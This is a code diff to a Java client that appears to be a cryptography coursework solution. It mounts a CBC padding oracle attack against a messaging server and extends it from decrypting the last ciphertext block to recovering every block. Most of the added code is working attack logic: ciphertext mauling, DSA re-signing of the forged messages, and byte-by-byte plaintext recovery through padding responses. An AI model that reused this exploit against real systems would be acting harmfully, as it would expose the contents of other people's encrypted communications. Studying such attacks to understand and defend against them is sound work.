@@ -25,6 +25,7 @@ import java.nio.charset.StandardCharsets;
 import java.security.*;
 import java.security.spec.X509EncodedKeySpec;
 import java.util.Arrays;
+import java.util.concurrent.TimeUnit;
 import java.util.zip.CRC32;
 import java.util.zip.Checksum;
 
@@ -82,7 +83,7 @@ public class MyClient {
                     }
                 }
             }
-
+System.out.println(sender.length() + " sender length");
             clientuser = "" + sender.charAt(0);
             register(); //register as first letter of sender name. "a" for alice
 
@@ -90,52 +91,23 @@ public class MyClient {
             int found = huntForByte(originalMessage, 17); //change the 17th byte until accepted by target (colon)
 
             System.out.println("Begin padding oracle attack!");
+            String builtMessage = "";
             String baseMessage = maulMessage(originalMessage, (byte) found, 17);
-
-            //This is so that 04 04 04 ?? succeeds only on 01 and not on 04
-            baseMessage = maulMessage(baseMessage, (byte) 0, numbytes - 2);
-            baseMessage = maulMessage(baseMessage, (byte) 0, numbytes - 3);
-
-
-            byte[] unknownpad = new byte[16]; //numbytes];
-            byte[] plaintext = new byte[16]; //numbytes];
-            byte ogCipherByte;
-            byte padByte;
-            byte ogPlaintextByte;
-            byte hunted = 0;
-            for (int i = 1; i <= 16; i++) {
-                //special case for second to last since last could have been 0 or 1 to pass padding
-                if (i == 2) {
-                    hunted = specialCaseFor2(originalMessage, numbytes, baseMessage, unknownpad, plaintext, hunted);
-                }
-                else {
-                    hunted = (byte) huntForByte(baseMessage, numbytes - i);
-                }
-
-                ogCipherByte = getByte(originalMessage, numbytes - i);
-                padByte = (byte) ( hunted ^  i);
-                ogPlaintextByte = (byte) (ogCipherByte ^ padByte);
-
-                unknownpad[16-i] = padByte;
-                plaintext[16-i] = ogPlaintextByte;
-                System.out.println(padByte + " padbyte" );
-                System.out.println(hunted + " hunted");
-                System.out.println(i + " i");
-                System.out.println(ogCipherByte + "ogCipher");
-                System.out.println(ogPlaintextByte + " ogPlain");
-
-                for (int j = 1; j <= i; j++) {
-                    baseMessage = maulMessage(baseMessage, (byte) (((byte) (i + 1)) ^ unknownpad[16-j]), numbytes - j);
-                }
+            int startingBlock = (numbytes/16) - 2; //0 indexed, skip first (iv)
+            for (int blockFromBack = 0; blockFromBack <= startingBlock; blockFromBack++) {
+                System.out.println("Decrypting Block from back: " + blockFromBack);
+                String truncatedOG = truncateBlocks(originalMessage, blockFromBack);
+                String truncatedBase = truncateBlocks(baseMessage, blockFromBack);
+                int numChars = 16;
+                if (blockFromBack == startingBlock) numChars = 16 - 1 - sender.length(); //sender:
+                String text = hackLastBlock(truncatedOG, truncatedBase, numChars);
+System.out.println(text);
+                builtMessage = text + builtMessage;
+                System.out.println("Message so far:");
+                System.out.println(builtMessage);
             }
 
-            System.out.println("DONE!");
-            System.out.println(unknownpad);
-            System.out.println(new String(unknownpad));
-            System.out.println(plaintext);
-            System.out.println(new String(plaintext));
-
-
+            System.out.println("Attack complete.");
 
             httpClient.close();
 
@@ -145,11 +117,96 @@ public class MyClient {
         }
     }
 
+    private static String truncateBlocks(String inputMessage, int blockFromBack) throws UnsupportedEncodingException, NoSuchAlgorithmException, InvalidKeyException, SignatureException {
+        String[] encoded = inputMessage.split(" ");
+
+        Base64 base64 = new Base64();
+        byte[] C1 = base64.decode(encoded[0]);
+        byte[] C2 = base64.decode(encoded[1]);
+
+        C2 = Arrays.copyOfRange(C2, 0, C2.length - (16*blockFromBack));
+
+        byte[] C164 = new String(base64.encode(C1)).getBytes("UTF-8");
+        byte[] C264 = new String(base64.encode(C2)).getBytes("UTF-8");
+
+        //9 DSA signature sigma
+        Signature dsasig = Signature.getInstance("SHA1withDSA");
+        dsasig.initSign(skdsa);
+        byte[] tosig = concat(concat(C164, " ".getBytes("US-ASCII")), C264);
+        dsasig.update(tosig);
+        byte[] sigma = dsasig.sign();
+
+        //10 sigma64
+        byte[] sigma64 = new String(base64.encode(sigma)).getBytes("UTF-8");
+
+        //11 C164|| ||C264|| ||sigma64
+        byte[] Cbytes = concat(C164, concat(" ".getBytes("US-ASCII"), concat(C264, concat(
+                " ".getBytes("US-ASCII"), sigma64))));
+
+        return new String(Cbytes);
+    }
+
+    private static String hackLastBlock(String originalMessageTruncated, String baseMessage, int numChars) throws NoSuchAlgorithmException, InvalidKeyException, SignatureException, IOException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
+        int numbytes = getByteLength(baseMessage);
+
+        //This is so that 04 04 04 ?? succeeds only on 01 and not on 04
+        baseMessage = maulMessage(baseMessage, (byte) 0, numbytes - 2);
+        baseMessage = maulMessage(baseMessage, (byte) 0, numbytes - 3);
+
+        byte[] unknownpad = new byte[16]; //numbytes];
+        byte[] plaintext = new byte[16]; //numbytes];
+
+        byte ogCipherByte;
+        byte padByte;
+        byte ogPlaintextByte;
+        byte hunted = 0;
+        for (int i = 1; i <= numChars; i++) {
+            //special case for second to last since last could have been 0 or 1 to pass padding
+            if (i == 2) {
+                hunted = specialCaseFor2(originalMessageTruncated, numbytes, baseMessage, unknownpad, plaintext, hunted);
+            }
+            else {
+                hunted = (byte) huntForByte(baseMessage, numbytes - i);
+            }
+
+            ogCipherByte = getByte(originalMessageTruncated, numbytes - i);
+            padByte = (byte) ( hunted ^  i);
+            ogPlaintextByte = (byte) (ogCipherByte ^ padByte);
+
+            unknownpad[16-i] = padByte;
+            plaintext[16-i] = ogPlaintextByte;
+            //System.out.println(padByte + " padbyte" );
+            //System.out.println(hunted + " hunted");
+            System.out.println(i + " i");
+            //System.out.println(ogCipherByte + "ogCipher");
+            System.out.println(ogPlaintextByte + " ogPlain");
+
+            for (int j = 1; j <= i; j++) {
+                baseMessage = maulMessage(baseMessage, (byte) (((byte) (i + 1)) ^ unknownpad[16-j]), numbytes - j);
+            }
+        }
+
+        System.out.println("DONE!");
+        //System.out.println(unknownpad);
+        //System.out.println(new String(unknownpad));
+        //System.out.println(plaintext);
+        System.out.println(new String(plaintext));
+        return new String(plaintext);
+    }
+
     private static byte specialCaseFor2(String originalMessage, int numbytes, String baseMessage, byte[] unknownpad, byte[] plaintext, byte lower) throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
         byte padByte;
         byte ogCipherByte;
         byte ogPlaintextByte;
+
+        try {
+            TimeUnit.SECONDS.sleep(10);
+        } catch (Exception e) {
+            System.out.println(e);
+        }
         processInbox(); //often second message is in the pipes
+                        //so give it plenty of time to get there and then be cleared out
+
         int higher = lower + 1;
 
         System.out.println("Cleaned");
